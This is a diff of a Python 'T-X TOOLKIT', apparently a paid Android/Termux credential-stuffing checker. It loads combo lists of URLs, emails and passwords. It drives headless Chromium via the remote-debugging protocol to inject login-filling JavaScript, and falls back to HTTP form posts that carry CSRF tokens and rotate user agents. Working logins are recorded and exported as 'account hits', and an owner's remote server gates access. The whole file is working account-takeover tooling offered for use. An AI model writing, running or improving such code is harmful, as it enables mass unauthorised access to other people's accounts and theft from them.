@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-T-X TOOLKIT v3.0
+T-X TOOLKIT v4.0 — Real Chromium Login · Clean Output · File Browser
 Created by Saeka Tojirp
 Usage : tx
 """
@@ -18,13 +18,12 @@ init(autoreset=True)
 OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
 APPROVED_FILE = os.path.expanduser("~/.tx_approved")
 ALIAS_FILE = os.path.expanduser("~/.bashrc")
-CHROME_PATH = "/data/data/com.termux/files/usr/bin/chromium-browser"
+CHROME = "/data/data/com.termux/files/usr/bin/chromium-browser"
 
-R = Fore.RED; G = Fore.GREEN; B = Fore.BLUE; Y = Fore.YELLOW
-M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
+R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE
 DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
 COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
-GLITCH_COLORS = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]
+GLITCH = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
@@ -35,12 +34,12 @@ USER_AGENTS = [
 
 # ── UTILS ──
 def tw(): return shutil.get_terminal_size().columns
-def fix_url(url):
-    if not url: return url
-    url = url.strip()
-    if not url.startswith(('http://','https://')):
-        url = 'https://' + url
-    return url
+def fix_url(u):
+    if not u: return u
+    u = u.strip()
+    if not u.startswith(('http://','https://')):
+        u = 'https://' + u
+    return u
 def center_print(text, color=W):
     w = tw()
     print(f"{color}{text.center(w)}{RES}")
@@ -60,56 +59,36 @@ def progress(cur, tot, label=""):
     sys.stdout.flush()
     if cur==tot: sys.stdout.write("\n")
 
-def detect_platform(url):
-    domain = urlparse(url).netloc.lower()
-    if 'google' in domain: return 'Google'
-    if 'facebook' in domain or 'fb.com' in domain: return 'Facebook'
-    if 'instagram' in domain: return 'Instagram'
-    if 'twitter' in domain or 'x.com' in domain: return 'Twitter/X'
-    if 'netflix' in domain: return 'Netflix'
-    if 'spotify' in domain: return 'Spotify'
-    if 'amazon' in domain: return 'Amazon'
-    if 'linkedin' in domain: return 'LinkedIn'
-    if 'github' in domain: return 'GitHub'
-    if 'microsoft' in domain or 'live.com' in domain: return 'Microsoft'
-    if 'yahoo' in domain: return 'Yahoo'
-    if 'discord' in domain: return 'Discord'
-    return domain.split('.')[-2].capitalize() if '.' in domain else 'Generic'
-
 # ── REAL CHROME ENGINE ──
-class RealChromeChecker:
+class RealChrome:
     def __init__(self):
-        self.process = None
-    def _start_browser(self):
-        args = [
-            CHROME_PATH,
-            "--remote-debugging-port=9222",
-            "--no-first-run", "--no-default-browser-check",
-            "--disable-gpu", "--disable-software-rasterizer",
-            "--disable-dev-shm-usage", "--headless=new"
-        ]
-        self.process = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.proc = None
+    def _start(self):
+        args = [CHROME, "--remote-debugging-port=9222", "--no-first-run",
+                "--no-default-browser-check", "--disable-gpu", "--disable-software-rasterizer",
+                "--disable-dev-shm-usage", "--headless=new"]
+        self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(2)
-    def _get_ws_url(self):
+    def _stop(self):
+        if self.proc:
+            self.proc.terminate()
+            self.proc = None
+    def _ws_url(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect(('127.0.0.1', 9222))
-        req = "GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n"
-        sock.send(req.encode())
-        resp = sock.recv(4096).decode()
+        sock.send(b"GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n")
+        data = sock.recv(4096).decode()
         sock.close()
-        body = resp.split('\r\n\r\n', 1)[1]
-        return json.loads(body)["webSocketDebuggerUrl"]
-    def _ws_send(self, ws_url, method, params={}):
-        p = urlparse(ws_url)
+        return json.loads(data.split('\r\n\r\n',1)[1])["webSocketDebuggerUrl"]
+    def _cmd(self, ws, method, params={}):
+        p = urlparse(ws)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ctx = ssl.create_default_context()
         s = ctx.wrap_socket(sock, server_hostname=p.hostname)
         s.connect((p.hostname, p.port))
-        hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\n"
-              f"Host: {p.hostname}:{p.port}\r\n"
+        hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\nHost: {p.hostname}:{p.port}\r\n"
               f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
-              f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
-              f"Sec-WebSocket-Version: 13\r\n\r\n")
+              f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
         s.send(hs.encode())
         s.recv(4096)
         payload = json.dumps({"id":1,"method":method,"params":params})
@@ -117,152 +96,120 @@ class RealChromeChecker:
         s.send(frame)
         resp = s.recv(8192)
         s.close()
-        if len(resp) > 2:
-            return json.loads(resp[2:])
-        return {}
-    def attempt_login(self, url, email, password):
-        res = {
-            'link':url, 'email':email, 'pass':password,
-            'active':False, 'info':'', 'balance':'',
-            'time':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'platform':detect_platform(url)
-        }
+        return json.loads(resp[2:]) if len(resp)>2 else {}
+    def login(self, url, email, password):
+        res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
         url = fix_url(url)
         try:
-            self._start_browser()
-            ws = self._get_ws_url()
-            self._ws_send(ws, "Target.createTarget", {"url":"about:blank"})
-            self._ws_send(ws, "Page.navigate", {"url":url})
+            self._start()
+            ws = self._ws_url()
+            self._cmd(ws, "Target.createTarget", {"url":"about:blank"})
+            self._cmd(ws, "Page.navigate", {"url":url})
             time.sleep(4)
-            js_fill = f"""
-                const e = document.querySelector('input[type="email"], input[type="text"], input[name*="email"], input[name*="user"], input[name*="login"]');
-                const p = document.querySelector('input[type="password"]');
-                if(e) e.value = '{email}';
-                if(p) p.value = '{password}';
-                const btn = document.querySelector('button[type="submit"], input[type="submit"]');
-                if(btn) btn.click(); else if(p && p.form) p.form.submit();
-                'done'
+            js = f"""
+                const e=document.querySelector('input[type="email"],input[type="text"],input[name*="email"],input[name*="user"],input[name*="login"]');
+                const p=document.querySelector('input[type="password"]');
+                if(e)e.value='{email}'; if(p)p.value='{password}';
+                const b=document.querySelector('button[type="submit"],input[type="submit"]');
+                if(b)b.click(); else if(p&&p.form)p.form.submit(); 'done'
             """
-            self._ws_send(ws, "Runtime.evaluate", {"expression":js_fill})
+            self._cmd(ws, "Runtime.evaluate", {"expression":js})
             time.sleep(3)
-            js_check = "document.body.innerText.includes('Logout') || document.body.innerText.includes('My Account') || document.body.innerText.includes('Dashboard') || document.body.innerText.includes('Sign Out')"
-            result = self._ws_send(ws, "Runtime.evaluate", {"expression":js_check})
-            success = bool(result.get("result",{}).get("value",False))
-            if success:
+            check = "document.body.innerText.includes('Logout')||document.body.innerText.includes('My Account')||document.body.innerText.includes('Dashboard')||document.body.innerText.includes('Sign Out')"
+            r = self._cmd(ws, "Runtime.evaluate", {"expression":check})
+            ok = bool(r.get("result",{}).get("value",False))
+            if ok:
                 res['active'] = True
-                res['info'] = "Login successful (Chrome DOM)"
+                res['info'] = "OK"
             else:
-                js_url = "window.location.href"
-                url_check = self._ws_send(ws, "Runtime.evaluate", {"expression":js_url})
-                current_url = url_check.get("result",{}).get("value","")
-                if current_url and 'login' not in current_url.lower() and 'signin' not in current_url.lower():
+                curl = self._cmd(ws, "Runtime.evaluate", {"expression":"window.location.href"})
+                cur_url = curl.get("result",{}).get("value","")
+                if cur_url and 'login' not in cur_url.lower() and 'signin' not in cur_url.lower():
                     res['active'] = True
-                    res['info'] = "Redirected away from login"
+                    res['info'] = "Redirect"
                 else:
                     res['active'] = False
-                    res['info'] = "Still on login page"
+                    res['info'] = "Invalid"
         except Exception as e:
-            res['info'] = f"Chrome error: {str(e)[:40]}"
+            res['info'] = f"Err:{str(e)[:30]}"
         finally:
-            if self.process:
-                self.process.terminate()
-                self.process = None
+            self._stop()
         return res
 
 # ── HTTP FALLBACK ──
-def http_login_check(url, email, password):
-    res = {
-        'link':url, 'email':email, 'pass':password,
-        'active':False, 'info':'', 'balance':'',
-        'time':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'platform':detect_platform(url)
-    }
+def http_login(url, email, password):
+    res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
     url = fix_url(url)
     sess = requests.Session()
-    sess.headers.update({
-        "User-Agent": random.choice(USER_AGENTS),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    })
+    sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
     try:
-        time.sleep(random.uniform(0.3, 1.0))
+        time.sleep(random.uniform(0.3,1.0))
         r = sess.get(url, timeout=12, allow_redirects=True)
         soup = BeautifulSoup(r.text, 'html.parser')
         form = None
         for f in soup.find_all('form'):
-            if f.find('input', {'type':'password'}):
-                form = f; break
+            if f.find('input',{'type':'password'}): form = f; break
         if not form:
-            if any(kw in r.text.lower() for kw in ['logout','dashboard','account']):
-                res['active'] = True; res['info'] = "Already logged in"
-            else:
-                res['info'] = "No login form"
+            res['info'] = "No form"
             return res
         inputs = {i.get('name'):i.get('value','') for i in form.find_all('input') if i.get('name')}
-        user_f = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
-        if not user_f:
+        uf = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
+        if not uf:
             for k in inputs:
-                if k not in ('password','pass','pwd','submit','button','csrf','token'):
-                    user_f = k; break
-        pass_f = next((k for k in inputs if 'pass' in k), 'password')
+                if k not in ('password','pass','pwd','submit','button','csrf','token'): uf = k; break
+        pf = next((k for k in inputs if 'pass' in k), 'password')
         action = urljoin(url, form.get('action',''))
-        csrf_token = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
+        csrf_val = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
         csrf_name = next((k for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
-        data = {user_f:email, pass_f:password}
-        if csrf_name and csrf_token: data[csrf_name] = csrf_token
+        data = {uf:email, pf:password}
+        if csrf_name and csrf_val: data[csrf_name] = csrf_val
         for k,v in inputs.items():
-            if k not in (user_f,pass_f,csrf_name): data[k] = v
+            if k not in (uf,pf,csrf_name): data[k] = v
         sess.headers['Referer'] = url
         r2 = sess.post(action, data=data, timeout=12, allow_redirects=True)
-        text = r2.text.lower(); final_url = r2.url.lower()
-        success_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','my account','sign out']
-        fail_kw = ['incorrect','invalid','wrong','error','not found',"doesn't match",'does not match','please try again','password is incorrect','login failed']
-        if any(kw in text for kw in success_kw) and not any(kw in text for kw in fail_kw):
-            res['active'] = True; res['info'] = f"HTTP {r2.status_code}"
-        elif any(kw in text for kw in fail_kw):
-            res['active'] = False; res['info'] = "Invalid credentials"
-        elif 'login' not in final_url and 'signin' not in final_url and 'auth' not in final_url:
-            res['active'] = True; res['info'] = "Redirected"
+        text = r2.text.lower(); final = r2.url.lower()
+        ok_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','sign out']
+        fail_kw = ['incorrect','invalid','wrong','error','not found',"doesn't match",'does not match','please try again','login failed']
+        if any(k in text for k in ok_kw) and not any(k in text for k in fail_kw):
+            res['active'] = True; res['info'] = "OK"
+        elif any(k in text for k in fail_kw):
+            res['active'] = False; res['info'] = "Invalid"
+        elif 'login' not in final and 'signin' not in final:
+            res['active'] = True; res['info'] = "Redirect"
         elif len(sess.cookies) > 2:
-            res['active'] = True; res['info'] = "Session cookies"
+            res['active'] = True; res['info'] = "Cookies"
         else:
-            res['active'] = False; res['info'] = "Still on login"
-        bal = re.search(r'(?:balance|credit|points)[\s:$]*(\d+\.?\d{0,2})', r2.text, re.I)
-        if bal: res['balance'] = bal.group(1)
+            res['active'] = False; res['info'] = "Login page"
     except Exception as e:
-        res['info'] = f"Error: {str(e)[:40]}"
+        res['info'] = f"Err:{str(e)[:30]}"
     return res
 
 # ── AUTH ──
-def generate_token(name):
+def gen_token(name):
     raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
     return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
-def request_token_once(name):
+def get_token(name):
     if os.path.exists(APPROVED_FILE):
-        with open(APPROVED_FILE,'r') as f:
-            if f.read().strip() == 'approved':
-                return None, 'approved'
-    token = generate_token(name)
+        with open(APPROVED_FILE) as f:
+            if f.read().strip()=='approved': return None,'approved'
+    token = gen_token(name)
     try:
         r = requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
-        if r.status_code==201:
-            data = r.json()
-            if data.get('status')=='approved':
-                with open(APPROVED_FILE,'w') as f: f.write('approved')
-                return token, 'approved'
-            return token, 'pending'
-    except: pass
-    return token, 'pending'
-def wait_for_approval(token):
+        if r.status_code==201 and r.json().get('status')=='approved':
+            with open(APPROVED_FILE,'w') as f: f.write('approved')
+            return token,'approved'
+        return token,'pending'
+    except: return token,'pending'
+def wait_ok(token):
     while True:
         try:
             r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
             if r.status_code==200:
-                data = r.json()
-                if data['status']=='approved':
+                d = r.json()
+                if d['status']=='approved':
                     with open(APPROVED_FILE,'w') as f: f.write('approved')
                     return True
-                elif data['status']=='declined':
-                    return False
+                if d['status']=='declined': return False
         except: pass
         time.sleep(3)
 
@@ -270,16 +217,15 @@ def wait_for_approval(token):
 def main():
     for _ in range(10):
         os.system('clear')
-        spin("Initialising...", 0.5)
+        spin("Loading...",0.5)
         center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
         time.sleep(0.5)
     os.system('clear')
     center_print("WHAT SHOULD YOUR NAME BE?", Y)
-    name = input(f"  {W}> {RES}").strip()
-    if not name: name = "User"
+    name = input(f"  {W}> {RES}").strip() or "User"
     os.system('clear')
-    token, status = request_token_once(name)
-    if status == 'approved':
+    token, status = get_token(name)
+    if status=='approved':
         center_print("ACCESS GRANTED", G)
         time.sleep(1)
     else:
@@ -287,7 +233,7 @@ def main():
         time.sleep(0.5)
         center_print(f"YOUR REQUEST TOKEN IS {token}", W)
         center_print("PLEASE ASK THE OWNER TO APPROVE", DIM)
-        if not wait_for_approval(token):
+        if not wait_ok(token):
             center_print("REQUEST DECLINED!", R)
             sys.exit(0)
         os.system('clear')
@@ -296,29 +242,24 @@ def main():
 
     combo_file = None
     hits = []
-    checker = RealChromeChecker()
+    chrome = RealChrome()
 
     while True:
         os.system('clear')
         w = tw()
         print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
         title = "T-X PAID TOOL"
-        for i,ch in enumerate(title):
-            sys.stdout.write(f"{GLITCH_COLORS[i%len(GLITCH_COLORS)]}{ch}{RES}")
+        for i,ch in enumerate(title): sys.stdout.write(f"{GLITCH[i%4]}{ch}{RES}")
         print("\n")
         menu = ["[ 1 ] START CHECKING","[ 2 ] SEE ACCOUNT HITS!","[ 3 ] EXPORT LOGS","[ 4 ] SETUP FILE PATH","[ 5 ] EXIT"]
         for idx,line in enumerate(menu):
-            if idx==3 and not combo_file:
-                print(f"  {R}{line}{RES}")
-            else:
-                print(f"  {W}{line}{RES}")
+            if idx==3 and not combo_file: print(f"  {R}{line}{RES}")
+            else: print(f"  {W}{line}{RES}")
         t = int(time.time())%10//5
-        creator_color = COLOR_LOOP[t]
-        print(f"\n  {creator_color}Created{RES} by Saeka Tojirp.", end='')
-        try:
-            choice = input(f"\n  {W}> {RES}").strip()
-        except (EOFError, KeyboardInterrupt):
-            break
+        cc = COLOR_LOOP[t]
+        print(f"\n  {cc}Created{RES} by Saeka Tojirp.", end='')
+        try: choice = input(f"\n  {W}> {RES}").strip()
+        except: break
 
         if choice=='1':
             if not combo_file:
@@ -335,8 +276,8 @@ def main():
                         proto,rest=line.split('://',1)
                         if ':' in rest:
                             domain,creds=rest.split(':',1)
-                            e,pw=creds.split(':',1) if ':' in creds else (creds,'')
-                            combos.append((proto+'://'+domain,e.strip(),pw.strip()))
+                            e,p=creds.split(':',1) if ':' in creds else (creds,'')
+                            combos.append((proto+'://'+domain,e.strip(),p.strip()))
                     else:
                         parts=line.split(':')
                         if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),':'.join(parts[2:]).strip()))
@@ -347,14 +288,13 @@ def main():
             print(f"  {DIM}{'─'*90}{RES}")
             def worker(url,email,pw):
                 nonlocal done,active
-                res = checker.attempt_login(url,email,pw)
-                if not res['active'] and 'Chrome error' in res.get('info',''):
-                    res = http_login_check(url,email,pw)
+                r = chrome.login(url,email,pw)
+                if not r['active'] and 'Err' in r.get('info',''): r = http_login(url,email,pw)
                 with lock:
-                    results.append(res); done+=1
-                    if res['active']: active+=1
-                    act=f"{G}ACCOUNT HIT!{RES}" if res['active'] else f"{R}INVALID{RES}"
-                    print(f"  {W}{res['link'][:33]:<35}{DIM} | {RES}{W}{res['email'][:26]:<28}{DIM} | {RES}{W}{res['pass'][:18]:<20}{DIM} | {RES}{act}")
+                    results.append(r); done+=1
+                    if r['active']: active+=1
+                    st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
+                    print(f"  {W}{r['link'][:33]:<35}{DIM} | {RES}{W}{r['email'][:26]:<28}{DIM} | {RES}{W}{r['pass'][:18]:<20}{DIM} | {RES}{st}")
                     progress(done,total,"Checking")
             with ThreadPoolExecutor(max_workers=3) as ex:
                 for url,email,pw in combos: ex.submit(worker,url,email,pw)
@@ -369,7 +309,7 @@ def main():
                 while True:
                     os.system('clear')
                     print(f"  {G}HITS{RES}  Page {page+1}/{ (len(hits)-1)//per +1 }")
-                    for r in hits[page*per:(page+1)*per]: print(f"  {r['email']}:{r['pass']} | {r.get('balance','')} | {r.get('time','')}")
+                    for r in hits[page*per:(page+1)*per]: print(f"  {r['email']}:{r['pass']}")
                     print(f"\n  {DIM}[N]ext [P]rev [Q]uit{RES}")
                     k=input().strip().lower()
                     if k=='n' and page<(len(hits)-1)//per: page+=1
@@ -385,102 +325,63 @@ def main():
         elif choice=='4':
             os.system('clear')
             print(f"  {Y}BROWSE FOR COMBO FILE{RES}\n")
-            dirs = [
-                os.path.expanduser("~"),
-                os.path.expanduser("~/downloads"),
-                "/sdcard",
-                "/storage/emulated/0",
-                "/storage/emulated/0/Download",
-            ]
+            dirs = [os.path.expanduser("~"), os.path.expanduser("~/downloads"),
+                    "/sdcard", "/storage/emulated/0", "/storage/emulated/0/Download"]
             dirs = [d for d in dirs if os.path.isdir(d)]
             print(f"  {W}Quick access:{RES}")
-            for i, d in enumerate(dirs):
-                print(f"  {G}[{i+1}]{RES} {d}")
-            print(f"  {G}[M]{RES} Manual path entry")
-            print(f"  {G}[0]{RES} Back\n")
-            choice2 = input(f"  {W}> {RES}").strip()
-            if choice2 == '0':
-                continue
-            elif choice2.upper() == 'M':
-                path = input(f"  {W}Enter full path: {RES}").strip()
-                path = os.path.expanduser(path)
-                if os.path.exists(path):
-                    combo_file = path
-                    print(f"  {G}File set!{RES}")
-                else:
-                    print(f"  {R}Not found: {path}{RES}")
+            for i,d in enumerate(dirs): print(f"  {G}[{i+1}]{RES} {d}")
+            print(f"  {G}[M]{RES} Manual path entry\n  {G}[0]{RES} Back")
+            c2 = input(f"  {W}> {RES}").strip()
+            if c2=='0': continue
+            if c2.upper()=='M':
+                p = input(f"  {W}Full path: {RES}").strip()
+                p = os.path.expanduser(p)
+                if os.path.exists(p): combo_file = p; print(f"  {G}File set!{RES}")
+                else: print(f"  {R}Not found.{RES}")
                 time.sleep(1)
-            elif choice2.isdigit() and 1 <= int(choice2) <= len(dirs):
-                current_dir = dirs[int(choice2)-1]
-                page = 0
-                per = 15
+            elif c2.isdigit() and 1<=int(c2)<=len(dirs):
+                cur = dirs[int(c2)-1]; page=0; per=15
                 while True:
                     os.system('clear')
-                    print(f"  {Y}Browsing: {current_dir}{RES}\n")
-                    try:
-                        items = sorted(os.listdir(current_dir))
-                    except PermissionError:
-                        print(f"  {R}Permission denied.{RES}")
-                        time.sleep(1)
-                        break
+                    print(f"  {Y}Browsing: {cur}{RES}\n")
+                    try: items = sorted(os.listdir(cur))
+                    except: print(f"  {R}Permission denied.{RES}"); time.sleep(1); break
                     visible = []
-                    for item in items:
-                        full = os.path.join(current_dir, item)
-                        if os.path.isdir(full) and not item.startswith('.'):
-                            visible.append(('DIR', item))
-                        elif os.path.isfile(full) and (item.endswith('.txt') or item.endswith('.combo') or 'combo' in item.lower() or 'ulp' in item.lower()):
-                            visible.append(('FILE', item))
-                    total_pages = (len(visible)-1)//per + 1 if visible else 1
-                    start = page * per
-                    for i, (typ, name) in enumerate(visible[start:start+per], start):
-                        prefix = f"{C}[DIR]{RES}" if typ == 'DIR' else f"{W}[FILE]{RES}"
-                        print(f"  {G}[{i+1}]{RES} {prefix} {name}")
-                    if not visible:
-                        print(f"  {DIM}No compatible files found.{RES}")
+                    for it in items:
+                        full = os.path.join(cur,it)
+                        if os.path.isdir(full) and not it.startswith('.'): visible.append(('DIR',it))
+                        elif os.path.isfile(full) and (it.endswith('.txt') or 'combo' in it.lower() or 'ulp' in it.lower()): visible.append(('FILE',it))
+                    total_pages = (len(visible)-1)//per+1 if visible else 1
+                    start = page*per
+                    for i,(tp,nm) in enumerate(visible[start:start+per], start):
+                        pre = f"{C}[DIR]{RES}" if tp=='DIR' else f"{W}[FILE]{RES}"
+                        print(f"  {G}[{i+1}]{RES} {pre} {nm}")
+                    if not visible: print(f"  {DIM}No compatible files.{RES}")
                     print(f"\n  {DIM}Page {page+1}/{total_pages} | [N]ext [P]rev [B]ack [M]anual{RES}")
                     sel = input(f"  {W}> {RES}").strip()
-                    if sel.upper() == 'B':
-                        break
-                    elif sel.upper() == 'N' and page < total_pages-1:
-                        page += 1
-                    elif sel.upper() == 'P' and page > 0:
-                        page -= 1
-                    elif sel.upper() == 'M':
-                        path = input(f"  {W}Enter full path: {RES}").strip()
-                        path = os.path.expanduser(path)
-                        if os.path.isfile(path):
-                            combo_file = path
-                            print(f"  {G}File set!{RES}")
-                            break
-                        elif os.path.isdir(path):
-                            current_dir = path
-                            page = 0
-                        else:
-                            print(f"  {R}Not found.{RES}")
-                            time.sleep(0.8)
+                    if sel.upper()=='B': break
+                    elif sel.upper()=='N' and page<total_pages-1: page+=1
+                    elif sel.upper()=='P' and page>0: page-=1
+                    elif sel.upper()=='M':
+                        p = input(f"  {W}Full path: {RES}").strip()
+                        p = os.path.expanduser(p)
+                        if os.path.isfile(p): combo_file = p; print(f"  {G}File set!{RES}"); time.sleep(1); break
+                        elif os.path.isdir(p): cur = p; page=0
+                        else: print(f"  {R}Not found.{RES}"); time.sleep(0.8)
                     elif sel.isdigit():
-                        idx = int(sel) - 1
-                        if 0 <= idx < len(visible):
-                            typ, name = visible[idx]
-                            full = os.path.join(current_dir, name)
-                            if typ == 'DIR':
-                                current_dir = full
-                                page = 0
-                            else:
-                                combo_file = full
-                                print(f"  {G}File set! → {full}{RES}")
-                                time.sleep(1)
-                                break
-
-        elif choice=='5':
-            break
+                        idx = int(sel)-1
+                        if 0<=idx<len(visible):
+                            tp,nm = visible[idx]
+                            full = os.path.join(cur,nm)
+                            if tp=='DIR': cur = full; page=0
+                            else: combo_file = full; print(f"  {G}File set!{RES}"); time.sleep(1); break
+        elif choice=='5': break
 
 def setup_alias():
     if not os.path.exists(ALIAS_FILE): return
     alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
-    with open(ALIAS_FILE,'r') as f: content = f.read()
-    if alias_cmd not in content:
-        os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")
+    with open(ALIAS_FILE) as f:
+        if alias_cmd not in f.read(): os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")
 
 if __name__=="__main__":
     setup_alias()
